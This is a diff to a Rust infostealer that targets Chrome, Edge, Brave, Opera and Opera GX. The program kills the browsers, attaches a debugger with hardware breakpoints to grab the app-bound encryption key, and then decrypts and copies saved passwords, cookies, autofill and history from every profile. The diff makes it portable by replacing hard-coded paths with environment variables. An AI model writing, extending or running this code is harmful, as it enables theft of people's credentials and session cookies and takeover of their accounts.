@@ -17,13 +17,13 @@ use rusqlite::{Connection};
 use chrono::{Utc};
 
 struct BrowserConfig {
-    name: &'static str,
-    process_name: &'static str,
-    exe_paths: &'static [&'static str],
-    dll_name: &'static str,
-    user_data_subdir: &'static [&'static str],
-    output_dir: &'static str,
-    temp_prefix: &'static str,
+    name: String,
+    process_name: String,
+    exe_paths: Vec<String>,
+    dll_name: String,
+    user_data_subdir: Vec<String>,
+    output_dir: String,
+    temp_prefix: String,
     use_r14: bool,
     use_roaming: bool,
     has_abe: bool,
@@ -274,96 +274,97 @@ extern "system" {
 }
 
 fn main() {
+    let program_files = std::env::var("ProgramFiles").unwrap_or("C:\\Program Files".to_string());
+    let program_files_x86 = std::env::var("ProgramFiles(x86)").unwrap_or("C:\\Program Files (x86)".to_string());
+    let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();
+
     let configs = vec![
         BrowserConfig {
-            name: "Google Chrome",
-            process_name: "chrome.exe",
-            exe_paths: &[
-                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-                "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
+            name: "Google Chrome".to_string(),
+            process_name: "chrome.exe".to_string(),
+            exe_paths: vec![
+                format!("{}\\Google\\Chrome\\Application\\chrome.exe", program_files),
+                format!("{}\\Google\\Chrome\\Application\\chrome.exe", program_files_x86),
             ],
-            dll_name: "chrome.dll",
-            user_data_subdir: &["Google", "Chrome", "User Data"],
-            output_dir: "chrome_extract",
-            temp_prefix: "chrome_tmp",
+            dll_name: "chrome.dll".to_string(),
+            user_data_subdir: vec!["Google".to_string(), "Chrome".to_string(), "User Data".to_string()],
+            output_dir: "chrome_extract".to_string(),
+            temp_prefix: "chrome_tmp".to_string(),
             use_r14: false,
             use_roaming: false,
             has_abe: true,
         },
         BrowserConfig {
-            name: "Microsoft Edge",
-            process_name: "msedge.exe",
-            exe_paths: &[
-                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
-                "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+            name: "Microsoft Edge".to_string(),
+            process_name: "msedge.exe".to_string(),
+            exe_paths: vec![
+                format!("{}\\Microsoft\\Edge\\Application\\msedge.exe", program_files_x86),
+                format!("{}\\Microsoft\\Edge\\Application\\msedge.exe", program_files),
             ],
-            dll_name: "msedge.dll",
-            user_data_subdir: &["Microsoft", "Edge", "User Data"],
-            output_dir: "edge_extract",
-            temp_prefix: "edge_tmp",
+            dll_name: "msedge.dll".to_string(),
+            user_data_subdir: vec!["Microsoft".to_string(), "Edge".to_string(), "User Data".to_string()],
+            output_dir: "edge_extract".to_string(),
+            temp_prefix: "edge_tmp".to_string(),
             use_r14: true,
             use_roaming: false,
             has_abe: true,
         },
         BrowserConfig {
-            name: "Brave",
-            process_name: "brave.exe",
-            exe_paths: &[
-                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
-                "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+            name: "Brave".to_string(),
+            process_name: "brave.exe".to_string(),
+            exe_paths: vec![
+                format!("{}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", program_files),
+                format!("{}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", program_files_x86),
             ],
-            dll_name: "chrome.dll",
-            user_data_subdir: &["BraveSoftware", "Brave-Browser", "User Data"],
-            output_dir: "brave_extract",
-            temp_prefix: "brave_tmp",
+            dll_name: "chrome.dll".to_string(),
+            user_data_subdir: vec!["BraveSoftware".to_string(), "Brave-Browser".to_string(), "User Data".to_string()],
+            output_dir: "brave_extract".to_string(),
+            temp_prefix: "brave_tmp".to_string(),
             use_r14: false,
             use_roaming: false,
             has_abe: true,
         },
         BrowserConfig {
-            name: "Opera Stable",
-            process_name: "opera.exe",
-            exe_paths: &[
-				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera\\opera.exe",
-                "C:\\Program Files\\Opera\\launcher.exe",
-                "C:\\Program Files (x86)\\Opera\\launcher.exe",
+            name: "Opera Stable".to_string(),
+            process_name: "opera.exe".to_string(),
+            exe_paths: vec![
+                format!("{}\\Programs\\Opera\\opera.exe", local_app_data),
+                format!("{}\\Opera\\launcher.exe", program_files),
+                format!("{}\\Opera\\launcher.exe", program_files_x86),
             ],
-            dll_name: "launcher_lib.dll",
-            user_data_subdir: &["Opera Software", "Opera Stable"],
-            output_dir: "opera_extract",
-            temp_prefix: "opera_tmp",
+            dll_name: "launcher_lib.dll".to_string(),
+            user_data_subdir: vec!["Opera Software".to_string(), "Opera Stable".to_string()],
+            output_dir: "opera_extract".to_string(),
+            temp_prefix: "opera_tmp".to_string(),
             use_r14: false,
             use_roaming: true,
             has_abe: false,
         },
         BrowserConfig {
-            name: "Opera GX",
-            process_name: "opera.exe",
-            exe_paths: &[
-				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera GX\\opera.exe",
-                "C:\\Program Files\\Opera GX\\launcher.exe",
-                "C:\\Program Files (x86)\\Opera GX\\launcher.exe",
+            name: "Opera GX".to_string(),
+            process_name: "opera.exe".to_string(),
+            exe_paths: vec![
+                format!("{}\\Programs\\Opera GX\\opera.exe", local_app_data),
+                format!("{}\\Opera GX\\launcher.exe", program_files),
+                format!("{}\\Opera GX\\launcher.exe", program_files_x86),
             ],
-            dll_name: "launcher_lib.dll",
-            user_data_subdir: &["Opera Software", "Opera GX Stable"],
-            output_dir: "operagx_extract",
-            temp_prefix: "operagx_tmp",
+            dll_name: "launcher_lib.dll".to_string(),
+            user_data_subdir: vec!["Opera Software".to_string(), "Opera GX Stable".to_string()],
+            output_dir: "operagx_extract".to_string(),
+            temp_prefix: "operagx_tmp".to_string(),
             use_r14: false,
             use_roaming: true,
             has_abe: false,
         },
     ];
 
-    unsafe {
-        kill_processes_by_name("chrome.exe");
-        kill_processes_by_name("msedge.exe");
-        kill_processes_by_name("brave.exe");
-        kill_processes_by_name("opera.exe");
-        kill_processes_by_name("launcher.exe");
+    for config in &configs {
+        unsafe { kill_processes_by_name(&config.process_name); }
     }
+    unsafe { kill_processes_by_name("launcher.exe"); }
 
     for config in configs {
-        let user_data_dir = match get_user_data_dir(config.user_data_subdir, config.use_roaming) {
+        let user_data_dir = match get_user_data_dir(&config.user_data_subdir, config.use_roaming) {
             Some(d) => d,
             None => {
                 println!("User data directory not found for {}, skipping...", config.name);
@@ -372,9 +373,9 @@ fn main() {
         };
 
         let mut exe_path = None;
-        for path in config.exe_paths {
+        for path in &config.exe_paths {
             if Path::new(path).exists() {
-                exe_path = Some(*path);
+                exe_path = Some(path.clone());
                 break;
             }
         }
@@ -464,10 +465,10 @@ unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &
                 let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                 if len > 0 {
                     let path = String::from_utf16_lossy(&buffer[..len as usize]);
-                    if path.contains(config.dll_name) {
+                    if path.contains(&config.dll_name) {
                         println!("Found {} at {:?}", config.dll_name, load_dll.lpBaseOfDll);
                         _dll_base = load_dll.lpBaseOfDll;
-                        target_address = find_target_address(h_process, _dll_base, config.name);
+                        target_address = find_target_address(h_process, _dll_base, &config.name);
                         if target_address != 0 {
                             let threads = get_all_threads(debug_event.dwProcessId);
                             println!("Setting hardware breakpoints for {} on {} threads", config.name, threads.len());
@@ -746,7 +747,7 @@ fn base64_decode(input: &str) -> Option<Vec<u8>> {
     None
 }
 
-fn get_user_data_dir(subdir: &[&str], use_roaming: bool) -> Option<PathBuf> {
+fn get_user_data_dir(subdir: &[String], use_roaming: bool) -> Option<PathBuf> {
     let app_data = if use_roaming {
         std::env::var("APPDATA").ok()?
     } else {
@@ -983,7 +984,7 @@ fn extract_all_profiles_data(v20_key: Option<[u8; 32]>, config: &BrowserConfig, 
     let v20_cipher = v20_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
 
     let profiles = discover_profiles(user_data_dir);
-    let extract_root = Path::new(config.output_dir);
+    let extract_root = Path::new(&config.output_dir);
     let _ = fs::create_dir_all(extract_root);
 
     let is_opera = config.name.contains("Opera");
@@ -994,10 +995,10 @@ fn extract_all_profiles_data(v20_key: Option<[u8; 32]>, config: &BrowserConfig, 
         let output_dir = extract_root.join(&profile_name);
         let _ = fs::create_dir_all(&output_dir);
 
-        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
-        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
-        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
-        extract_history(&profile_path, &output_dir, config.temp_prefix);
+        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), &config.temp_prefix, is_opera);
+        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), &config.temp_prefix, is_opera);
+        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), &config.temp_prefix, is_opera);
+        extract_history(&profile_path, &output_dir, &config.temp_prefix);
     }
     println!("Extraction complete. Data saved in {} folder.", config.output_dir);
 }
